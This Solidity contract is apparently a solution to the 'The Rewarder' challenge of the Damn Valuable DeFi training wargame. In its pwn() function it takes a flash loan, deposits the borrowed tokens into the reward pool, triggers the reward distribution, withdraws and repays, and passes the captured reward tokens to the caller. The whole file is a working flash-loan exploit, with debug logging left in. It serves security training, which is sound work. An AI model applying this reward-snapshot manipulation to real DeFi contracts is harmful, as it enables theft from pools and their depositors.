pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

import "hardhat/console.sol";

contract AaronRewarder {
    DamnValuableToken token;
    RewardToken rewardToken;
    TheRewarderPool pool;
    FlashLoanerPool loaner;

    uint256 amount;

    constructor(address _token, address _rewardToken, address _pool, address _loaner, uint256 _amount) {
        token = DamnValuableToken(_token);
        rewardToken = RewardToken(_rewardToken);
        pool = TheRewarderPool(_pool);
        loaner = FlashLoanerPool(_loaner);
        amount = _amount;
    }

    receive() payable external {}

    function receiveFlashLoan(uint256 _amount) public {
        //pool.approve(amount); // TODO
        console.log("1 balance: %s", token.balanceOf(address(this)));
        token.approve(address(pool), _amount);
        console.log("2 amount: %s", _amount);
        pool.deposit(_amount);
        pool.distributeRewards();
        console.log("3");
        pool.withdraw(_amount);
        console.log("4");
        //payable(address(loaner)).transfer(_amount);
        token.transfer(address(loaner), _amount);
        console.log("5");

    }

    function pwn() external {
        console.log("0 request amount: %s", amount);
        loaner.flashLoan(amount);
        console.log("6 got reward token: %s", rewardToken.balanceOf(address(this)));
        rewardToken.transfer(address(msg.sender), rewardToken.balanceOf(address(this)));
        console.log("7");
    }
}
